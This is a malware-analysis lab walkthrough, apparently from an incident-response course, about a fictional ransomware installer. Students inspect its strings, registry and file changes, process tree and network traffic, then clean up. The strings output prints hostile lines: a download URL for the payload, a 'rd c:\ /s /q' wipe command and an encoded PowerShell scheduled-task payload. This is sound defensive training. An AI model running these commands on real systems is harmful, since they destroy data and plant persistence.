# Brief Intro

In this lab you will continue investigating the Falsimentis incident by examining some of the malware used by the Midnite Meerkats.

##  Requirements for This Lab

In this lab, you will use your Windows 10 VM. Make sure the VM is running before continuing with this lab exercise.

## Try It Yourself

Read the continuation of the Falsimentis scenario at the start of the Walk Through section. Once you've familiarized yourself with the updates analyze the analyticsinstaller.exe file in the C:\tools\falsimentis directory. While analyzing this file try to answer the following questions:

What artifacts are left by the malware installer?
What host(s) and port(s) does the malware installer communicate with?
What is the mechanism used to delete files if the ransom is not paid, and how can it be disabled?

## Walkthrough

### Scenario Update

This lab assumes you're already familiar with the first two parts of the scenario. You may want to re-read the scenario descriptions in the Walk Through sections of Lab 1.2: Network Investigation and Lab 1.3: Memory Investigation before continuing here.
Courtesy of a limited threat intelligence report, it was revealed that the malware analytics.exe was installed by a tool called analyticsinstaller.exe. Copies of both specimens are included with the report. The CEO of Falsimentis has asked you not to upload the specimens to any online sites. You will need to perform this analysis without the aid of external analysis sites.

Since the file analyticsinstaller.exe is new to the scenario, the system administrator asked you to analyze this file.

### Calculate Basic Properties

First open a PowerShell prompt with administrative privileges. To do this right-click on the Windows PowerShell icon on your desktop, and then click Run as administrator.

Run PowerShell as Admin

Now change into the c:\tools\falsimentis directory and calculate the MD5 and SHA256 hash sums, as shown below.

        PS C:\WINDOWS\system32> cd c:\tools\falsimentis
        PS C:\tools\falsimentis> Get-FileHash -Algorithm MD5 AnalyticsInstaller.exe

        Algorithm       Hash                                                                   Path
        ---------       ----                                                                   ----
        MD5             5524BDF546472FD66D3450C39CC4E2E5                                       C:\tools\falsimentis\Analytic...

        PS C:\tools\falsimentis> Get-FileHash -Algorithm SHA256 AnalyticsInstaller.exe

        Algorithm       Hash                                                                   Path
        ---------       ----                                                                   ----
        SHA256          D501EF28D4C3F3C308461E5FB51929E3875395C38E6A885692C8788A3C376E45       C:\tools\falsimentis\Analytic...
        There is no standard hashing algorithm to use. Many analysts use a combination of MD5 and SHA256 to reduce the chance of misidentification due to collisions with specially-crafted malware.

The Get-FileHash command breaks down as follows:

-Algorithm controls which hashing algorithm is used, MD5 or SHA256.
AnalyticsInstaller.exe is the file to use for hash calculation.
Cryptographic hash sums are a common way to identify malware, since they remain the same even if the file name changes. This helps analysts confirm they are communicating about the same specimen.

## Examine Malware Strings

Run the Sysinternals strings utility to examine the ASCII and Unicode strings that are at least 10 characters long. To do this run C:\tools\sysinternals\strings.exe with the -n 10 argument.

When the EULA appears, click the Agree button to proceed.

        PS C:\tools\falsimentis> C:\tools\sysinternals\strings.exe -n 10 .\AnalyticsInstaller.exe
        Strings v2.53 - Search for ANSI and Unicode strings in binary images.
        Copyright (C) 1999-2016 Mark Russinovich
        Sysinternals - www.sysinternals.com

        This program cannot be run in DOS mode.
        @http://www1-google-analytics.com:8088/analytics.exe
        C:\Windows\System32\analytics.exe
        Software\Microsoft\Windows\CurrentVersion\Run
        Analytics Client
        RegOpenKeyEx error!
        C:\Windows\System32\AnalyticsBackup.bat
        cmd.exe /c rd c:\ /s /q
        powershell.exe -ExecutionPolicy Bypass -EncodedCommand JABtAG0AawAxACAAPQAgACIATgBUACAAQQBVAFQASABPAFIASQBUAFkAXABTAFkAU
        wBUAEUATQAiAAoAJABtAG0AawAyACAAPQAgACIAQQBuAGEAbAB5AHQAaQBjAHMAIABCAGEAYwBrAHUAcAAiAAoAJABtAG0AawAzACAAPQAgACIAQQBuAGEAb
        AB5AHQAaQBjAHMAIABCAGEAYwBrAHUAcAAgAFMAZQByAHYAaQBjAGUAIgAKACQAbQBtAGsANAAgAD0AIABbAEQAYQB0AGUAVABpAG0AZQBdADoAOgBOAG8Ad
        wAuAEEAZABkAEQAYQB5AHMAKAAxACkALgBUAG8AUwB0AHIAaQBuAGcAKAAiAEYAIgApAAoAJABtAG0AawA1ACAAPQAgAE4AZQB3AC0AUwBjAGgAZQBkAHUAb
        ABlAGQAVABhAHMAawBUAHIAaQBnAGcAZQByACAALQBPAG4AYwBlACAALQBBAHQAIAAkAG0AbQBrADQACgAkAG0AbQBrADYAIAA9ACAATgBlAHcALQBTAGMAa
        ABlAGQAdQBsAGUAZABUAGEAcwBrAEEAYwB0AGkAbwBuACAALQBFAHgAZQBjAHUAdABlACAAIgBDADoAXABXAGkAbgBkAG8AdwBzAFwAUwB5AHMAdABlAG0AM
        wAyAFwAYQBuAGEAbAB5AHQAaQBjAHMAYgBhAGMAawB1AHAALgBiAGEAdAAiAAoAJABtAG0AawA3ACAAPQAgAE4AZQB3AC0AUwBjAGgAZQBkAHUAbABlAGQAV
        ABhAHMAawBTAGUAdAB0AGkAbgBnAHMAUwBlAHQAIAAtAFMAdABhAHIAdABXAGgAZQBuAEEAdgBhAGkAbABhAGIAbABlACAALQBIAGkAZABkAGUAbgAgAC0AR
        ABvAG4AdABTAHQAbwBwAEkAZgBHAG8AaQBuAGcATwBuAEIAYQB0AHQAZQByAGkAZQBzACAALQBXAGEAawBlAFQAbwBSAHUAbgAgAC0AQQBsAGwAbwB3AFMAd
        ABhAHIAdABJAGYATwBuAEIAYQB0AHQAZQByAGkAZQBzAAoAUgBlAGcAaQBzAHQAZQByAC0AUwBjAGgAZQBkAHUAbABlAGQAVABhAHMAawAgAC0AVABhAHMAa
        wBOAGEAbQBlACAAIgBBAG4AYQBsAHkAdABpAGMAcwAgAEIAYQBjAGsAdQBwACIAIAAtAFQAcgBpAGcAZwBlAHIAIAAkAG0AbQBrADUAIAAtAFUAcwBlAHIAI
        AAkAG0AbQBrADEAIAAtAEEAYwB0AGkAbwBuACAAJABtAG0AawA2ACAALQBEAGUAcwBjAHIAaQBwAHQAaQBvAG4AIAAkAG0AbQBrADMAIAAtAFMAZQB0AHQAa
        QBuAGcAcwAgACQAbQBtAGsANwAKAA==
        cmd.exe /c start /max http://www.midnitemeerkats.com/note

(... omitted for space ...)
There are some strings worthy of note. First the URL http://www1-google-analytics.com:8088/analytics.exe. In lab 1.2: Network Investigation it was discovered that ports 8090 and 80 were used. This is an additional port that can be investigated.

The registry key Software\Microsoft\Windows\CurrentVersion\Run is an AutoStart Extensibility Point (ASEP) and is a common method used by malware to persist following a reboot.

The cmd.exe /c rd c:\ /s /q command is used to recursively delete files and folders starting at the root of the file system. Since the ransom note mentioned the loss of files, this could be a possible mechanism.

The powershell.exe command line has a base64 encoded command, which is suspicious, especially since this is malware.

The cmd.exe /c start /max http://www.midnitemeerkats.com/note will display a copy of the ransom note, similar to what the CEO saw.

Remember that it is straightforward for malware authors to embed fake strings and hide real strings. Therefore, you should consider strings output as suggestions. To consider them a definitive statement of fact without further verification is poor investigative work.

### Examine Registry and File System Changes

Now, let's take a look at some of the changes the malware installer makes to the environment. The first tool we'll use is Regshot. The Regshot tool is a snapshot-recording tool. That is, it takes a snapshot of the registry and (optionally) the file system at two different points in time and highlights the differences between the two.

#### Start and Configure Regshot
In your PowerShell prompt run the Regshot tool (64-bit version) as shown.

PS C:\tools\falsimentis> c:\tools\regshot\regshot_x64.exe
Once Regshot has started, you will be presented with a basic configuration screen. Regshot automatically scans the registry for changes. To have it also scan the file system for changes click on the checkbox labeled Scan dir1[;dir2;dir3...;dir nn] and then type C:\ in the box beneath the checkbox.

#### Configure Regshot

Take 1st Snapshot
Now take the first (baseline) snapshot using Regshot. To do this click 1st shot | Shot.

#### Take first regshot

IMPORTANT: This may take a minute or more to run. Make sure to let it finish before running the malware installer.

#### Run AnalyticsInstaller.exe

After the first snapshot has finished, switch back to the PowerShell prompt and run .\AnalyticsInstaller.exe. It will have completed once you see output about TaskPath and TaskName

        PS C:\tools\falsimentis> .\AnalyticsInstaller.exe

        TaskPath                                       TaskName                          State
        --------                                       --------                          -----
        \                                              Analytics Backup                  Ready

It is necessary to type the .\ since the current directory is not in the path.
Take 2nd Snapshot
Once the malware installer has completed take the second snapshot. To do this click 2nd shot | Shot.

#### Take second Regshot

Once the second snapshot has completed, the 2nd shot button will be greyed out and the Compare button will become available.

#### Compare Snapshots and Examine Output

Now use Regshot to compare the two snapshots. To do this click the Compare button.

Compare regshots

Once Regshot is done comparing the two snapshots, it will open a text file which shows a summary of the various types of changes. Even with the snapshot-recording approach, there can be quite a bit of output to review.

From the Keys Added section, the following entry is of interest:

HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\Analytics Backup
This key is created when scheduled tasks are created on Windows. To confirm use the Get-ScheduledTask cmdlet with -TaskName "Analytics Backup".

PS C:\tools\falsimentis> Get-ScheduledTask -TaskName "Analytics Backup"

        TaskPath                                       TaskName                          State
        --------                                       --------                          -----
        \                                              Analytics Backup                  Ready

From the Values Added section, the following entries are of interest:

        HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{12D55D49-D632-45DA-983F-E6C51C24C8F8}\Path: "\Analytics Backup"
        HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{12D55D49-D632-45DA-983F-E6C51C24C8F8}\Description: "Analytics Backup Service"
        HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run\Analytics Client: "C:\Windows\System32\analytics.exe"
        HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run\File Saver: "cmd.exe /c start /max http://www.midnitemeerkats.com/note"

The first two entries are related to the creation of the scheduled task. The third and fourth entries are ASEPs. The third entry runs the program C:\Windows\System32\analytics.exe when a user logs on. The fourth entry opens a browser window, pointing to the ransom note when a user logs on.

The WOW6432Node part of the registry key is an artifact of running 32-bit software on a 64-bit architecture. This is part of the Windows 32-bit on Windows 64-bit (WoW64) subsystem.
From the Files Added section, the following entries are of interest:

        C:\Windows\Prefetch\ANALYTICSINSTALLER.EXE-E57CE4F0.pf
        C:\Windows\System32\Tasks\Analytics Backup
        C:\Windows\SysWOW64\AnalyticsBackup.bat

Similar to WOW6432Node, SysWOW64 is due to running a 32-bit program on a 64-bit Windows system.
The first entry is part of the Windows Prefetcher (now SuperFetch) functionality. Prefetch files contain information about the most recent time a program was run, as well as the directory it was run from. This information can be correlated with other system artifacts and added to your timeline.

The second entry is the result of a scheduled task addition. The third entry shows a batch file addition. You can display the contents using the Get-Content cmdlet.

        PS C:\tools\falsimentis> Get-Content C:\Windows\SysWOW64\AnalyticsBackup.bat
        cmd.exe /c rd c:\ /s /q

This matches the line of output previously discovered in the strings command. Since this will recursively delete files, it is likely the mechanism the Midnite Meerkats used.

While we have discovered one possible mechanism, assuming that it is the only mechanism could lead to incomplete containment, and the possibility of system loss. Remember to be thorough during your investigations.
We're done with Regshot, so go ahead and close it.

### Examine Process Activity

Now let's use Procmon to get finer-grained detail about what the malware installer is doing. To do this run Procmon.exe as shown below. When the EULA appears, click the Agree button to continue.

PS C:\tools\falsimentis> C:\tools\sysinternals\Procmon.exe

#### Configure Procmon

Once Procmon starts up, it will be capturing events. To disable the capture, click the magnifying glass icon so that a red X appears.

Disable Procmon Capture

The next step is to create a filter to focus on just events related to AnalyticsInstaller.exe To do this click Filter | Filter.

In the Filter dialog box, select the drop down that shows Architecture and change it to Process Name. In the input box type AnalyticsInstaller.exe. Then click the Add button. Finally click the OK button at the bottom of the dialog box.

Now configure Procmon to discard events that do not match the display filters. This helps save memory since there can be many events generated, even on a "quiet" system. To do this click Filter | Drop Filtered Events.

#### Enable Capture, Run Malware, Disable Capture
Before starting the malware installer, enable event capturing by clicking on the magnifying glass icon, so the red X disappears.

Now switch back to PowerShell and run the malware installer.

PS C:\tools\falsimentis> .\AnalyticsInstaller.exe
Register-ScheduledTask : Cannot create a file when that file already exists.
At line:8 char:1
+ Register-ScheduledTask -TaskName "Analytics Backup" -Trigger $mmk5 -U ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ResourceExists: (PS_ScheduledTask:Root/Microsoft/...S_ScheduledTask) [Register-Scheduled
   Task], CimException
    + FullyQualifiedErrorId : HRESULT 0x800700b7,Register-ScheduledTask
The error message is because the scheduled task already exists. It can safely be ignored.
After the malware installer has completed, disable event capture by clicking on the magnifying glass icon again, so a red X appears.

Disable Capture

Examine Process Activity
One of the limitations of Regshot is that it only examines registry and file system activity. Let's use Procmon to examine process activity. To display just process activity, click the registry, file system, and network filter buttons. When you do this, they will no longer have a light blue background.

Focus on Process Activity

Now let's look for process creation. To do this click Edit | Find.

Open Find Dialog Box

In the Find dialog box, type Process Create into the box labeled Find what and click the Find Next button.

Search for Process Create

The first hit shows a Process Create operation for cmd.exe. To get more detail double-click on the highlighted entry.

Process Create First Hit

As you can see, the command line appears to spawn a PowerShell process. Since the filter we created earlier only included AnalyticsInstaller.exe, we won't see events related to cmd.exe or any processes it spawns.

Process Create First Hit Properties

Even though we did not include cmd.exe in the filter, Procmon still captures processes spawn activity in the Process Tree. To see this, close the Event Properties window, then click Tools | Process Tree.

Open Process Tree

As you can see, AnalyticsInstaller.exe spawned cmd.exe, which in turn spawned powershell.exe. If you click on any of these processes, the command line is shown.

Process Tree

Processes that have terminated are dimmed. However, you can still click on them.
Close Procmon after examining the command lines for each of the spawned child processes for AnalyticsInstaller.exe.

After completing your analysis of the child processes, close Procmon.

## IMPORTANT: Remove the Malware Artifacts

Before shutting down your Windows VM, make sure to remove the malware artifacts. First, run the Unregister-ScheduledTask cmdlet in PowerShell. When it asks you if you are sure, press y, as shown here.

PS C:\tools\falsimentis> Unregister-ScheduledTask -TaskName "Analytics Backup"

Confirm
Are you sure you want to perform this action?
Performing operation 'Delete' on Target '\Analytics Backup'.
[Y] Yes  [A] Yes to All  [N] No  [L] No to All  [S] Suspend  [?] Help (default is "Y"): y
Next, remove the malware artifacts in C:\windows\SysWOW64\analytics* as shown here.

        PS C:\tools\falsimentis> del c:\windows\syswow64\analytics*
        PS C:\tools\falsimentis>

Next, remove the ASEP entries for the Analytics Client and File Saver properties, as shown here.

        PS C:\tools\falsimentis> Get-Item HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run\ | Remove-ItemProperty -Name "Analytics Client"
        PS C:\tools\falsimentis> Get-Item HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run\ | Remove-ItemProperty -Name "File Saver"
        PS C:\tools\falsimentis> Get-Item HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run\

        Hive: HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion

        Name                           Property
        ----                           --------
        Run
    
Close the PowerShell window to complete the lab exercise.

## Summary

In this lab we discovered additional information about the Midnite Meerkats malware that can be used for incident response actions. The program AnalyticsInstaller.exe appears to be the primary installer used by the attackers. The malware performs the following activities:

Creates a scheduled task called Analytics Backup, described as the Analytics Backup Service.
Creates a batch file AnalyticsBackup.bat which if run, recursively deletes all files and folders on the C drive of a Windows system.
Communicates with www1-google-analytics.com on port 8088.
Will download the file analytics.exe if the file is provided.
Adds an ASEP under the CurrentVersion\Run registry key called Analytics Client, which runs analytics.exe
Adds an ASEP under the CurrentVersion\Run registry key called File Saver which displays a ransom note.

## Why This Lab is Important

During an incident you need to be able to quickly and accurately identify basic properties and activities of malware. This information can help with scoping, containment, eradication, and other incident response goals.

By applying static analysis (strings output inspection), dynamic analysis with a snapshot monitoring tool (RegShot) and dynamic analysis with a continuous monitoring tool (Procmon) we can build out understanding for what the software does. These details are valuable to better information the decisions we make as incident responders.

## Video Walkthrough

Watch the accompanying video instructions for additional information.

Video Walkthrough Screen Shot

## Bonus (If Time Permits or for Homework)

If you have additional time during the lab, or wish to continue your investigation of the Midnite Meerkats malware after class is over, you can continue with the lab steps below.

Note: For the bonus portion of the lab exercise you will need Slingshot Linux and your Windows 10 VM.
Examine Network Traffic
Earlier in the lab we used Procmon to evaluate the malware, which can reveal network behavior information. We can also network details by examining the network traffic using packet capture tools.

Start Tcpdump
On your Linux virtual machine open a command prompt and change into the /home/sec504/labs/falsimentis directory.

        sec504@slingshot:~$  cd /home/sec504/labs/falsimentis

Now start tcpdump to monitor for DNS requests as shown below.

        sec504@slingshot:~/labs/falsimentis$ sudo tcpdump -n -i eth0 udp port 53
        
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
The tcpdump command breaks down as follows:

-n - don't resolve host name or port numbers
-i eth0 - monitor traffic on the interface eth0
udp port 53 - only capture traffic destined for UDP port 53
Now switch back to your Windows virtual machine and set the DNS server to 10.10.75.1 using the Set-DnsClientServerAddress cmdlet.

PS C:\> Set-DnsClientServerAddress -InterfaceAlias Ethernet0 -ServerAddresses ("10.10.75.1")
Launch the malware installer again.

PS C:\tools\falsimentis> .\Analyticsinstaller
Register-ScheduledTask : Cannot create a file when that file already exists.
At line:8 char:1
+ Register-ScheduledTask -TaskName "Analytics Backup" -Trigger $mmk5 -U ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ResourceExists: (PS_ScheduledTask:Root/Microsoft/...S_ScheduledTask) [Register-Scheduled
   Task], CimException
    + FullyQualifiedErrorId : HRESULT 0x800700b7,Register-ScheduledTask
Examine Tcpdump Traffic
After the malware installer has finished running switch back to your Linux VM and stop tcpdump by pressing CTRL+C. Examine the tcpdump output – you will see one or more lines similar to the one below.

08:18:04.025272 IP 10.10.0.1.63424 > 10.10.75.1.53: 24230+ A? www1-google-analytics.com. (43)
You may also see additional DNS activity to Microsoft (dns.msftncsi.com, settings-win.data.microsoft.com) and Google (clients4.google.com, accounts.google.com) in the tcpdump output. This is normal activity and is unrelated to the malware installer.
This output shows a DNS request originating from your Window VM, directed towards your Linux VM, attempting to look up the host www1-google-analytics.com.

Molding the Environment
We're now going to start molding the environment to what the malware installer expects. Since it is attempting to look up a host name, we can add an entry to the hosts file on the Windows VM, pointing www1-google-analytics.com to 10.10.75.1 to intercept the request. Use the Add-Content cmdlet on Windows to add a local hostname record for www1-google-analytics.com, directing the request to your Slingshot Linux VM.

PS C:\tools\falsimentis> Add-Content -Path C:\windows\system32\drivers\etc\hosts -Value "10.10.75.1  www1-google-analytics.com"
Since we don't know what type of connections the malware will attempt to make to www1-google-analytics.com, we need to restart tcpdump and have it capture all traffic. To do this first exit tcpdump by pressing Ctrl+C. Then restart tcpdump without any filters.

sec504@slingshot:~/labs/falsimentis$ sudo tcpdump -n -i eth0
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
Now switch back to the Windows virtual machine and run the malware installer again.

C:\tools\falsimentis> .\AnalyticsInstaller
After the malware installer has finished running switch back to your Linux VM and stop tcpdump by pressing CTRL+C. Examine the tcpdump output – you will see one or more lines similar to the one below.

08:24:19.432923 IP 10.10.0.1.1545 > 10.10.75.1.8088: Flags [S], seq 4020164856, win 65535, options [mss 1460,nop,wscale 8,nop,nop,sackOK], length 0
08:24:19.433042 IP 10.10.75.1.8088 > 10.10.0.1.1545: Flags [R.], seq 0, ack 4020164857, win 0, length 0
The source port in the example above is 1545, yours will likely be different. This is not a problem. The key is the destination port 8088.
This shows a connection attempt to TCP port 8088. Since there is nothing currently listening on that port, a TCP reset is sent back.

Capture the Incoming Request
Since the malware installer is attempting to connect to TCP port 8088, let's set up a Netcat listener using the nc command.

sec504@slingshot:~/labs/falsimentis$ nc -n -v -l -p 8088
listening on [any] 8088 ...
The nc command breaks down as follows:

-n - don't resolve host names
-v - displays verbose output (e.g. when it is listening, when a connection is made, etc.)
-l - listen mode
-p 8088 - listen on port 8088
Now switch back to the Windows VM and run the malware installer again.

C:\tools\falsimentis> .\AnalyticsInstaller.exe
Switch back to your Linux VM and examine the output displayed by Netcat.

connect to [10.10.75.1] from (UNKNOWN) [10.10.0.1] 1546
GET /analytics.exe HTTP/1.1
Accept: */*
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.2; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729)
Host: www1-google-analytics.com:8088
Connection: Keep-Alive
This appears to be an HTTP GET request for /analytics.exe. Now that we've identified the protocol in use, we can terminate the Netcat listener by pressing CTRL+C and continue with molding the environment to give the malware the HTTP server it expects.

Serving analytics.exe with Python
A copy of analytics.exe has been provided in the /home/sec504/labs/falsimentis directory. To serve up the file over HTTP use Python's built-in web server and tell it to listen on port 8088.

sec504@slingshot:~/labs/falsimentis$ python3 -m http.server 8088
Serving HTTP on 0.0.0.0 port 8088 ...
This command breaks down as follows:

python3 - run the Python3 interpreter
-m http.server - run the http.server module
8088 - listen on port 8088
Now switch back to your Windows VM and run the malware installer from PowerShell.

C:\tools\falsimentis> .\AnalyticsInstaller.exe
Register-ScheduledTask : Cannot create a file when that file already exists.
At line:8 char:1
+ Register-ScheduledTask -TaskName "Analytics Backup" -Trigger $mmk5 -U ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ResourceExists: (PS_ScheduledTask:Root/Microsoft/...S_ScheduledTask) [Register-Scheduled
   Task], CimException
    + FullyQualifiedErrorId : HRESULT 0x800700b7,Register-ScheduledTask
Now switch back to your Linux VM. You will see output similar to what is shown below.

10.10.0.1 - - [12/Apr/2020 08:31:11] "GET /analytics.exe HTTP/1.1" 200 -
This suggests that indeed the malware installer is attempting to download the file analytics.exe. To further confirm this switch back to your Windows VM and look for analytics.exe in the C:\Windows\SysWOW64 directory (the same one the AnalyticsBackup.bat file was created in.)


PS C:\tools\falsimentis> dir C:\windows\SysWOW64\analytics*


    Directory: C:\windows\SysWOW64


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        4/14/2020   4:30 AM        9191161 analytics.exe
-a----        4/14/2020   4:30 AM             23 AnalyticsBackup.bat
Tip: When examining evidence, always consider the diagnosticity. That is, not only does the evidence support one theory, but does it also exclude other theories? In this case we have what appeared to be a regular HTTP GET request. The fact that the malware installer downloaded the file when provided supports this theory. However, this information by itself does not exclude other theories. For example, this could be how the malware checks in, using a request designed to fool analysts. Without further examination of additional evidence (e.g. network traffic, and ideally, code) it would be irresponsible to rule out other theories.
IMPORTANT: After completing the bonus portion of this lab exercise, you must return to the lab step labeled IMPORTANT: Remove the Malware Artifacts above to remove the malware from the Windows 10 VM.
Additional Resources
Related SANS Classes
FOR610: Reverse-Engineering Malware: Malware Analysis Tools and Techniques
Books
Chapter 10 of Applied Incident Response
Malware Analysis Techniques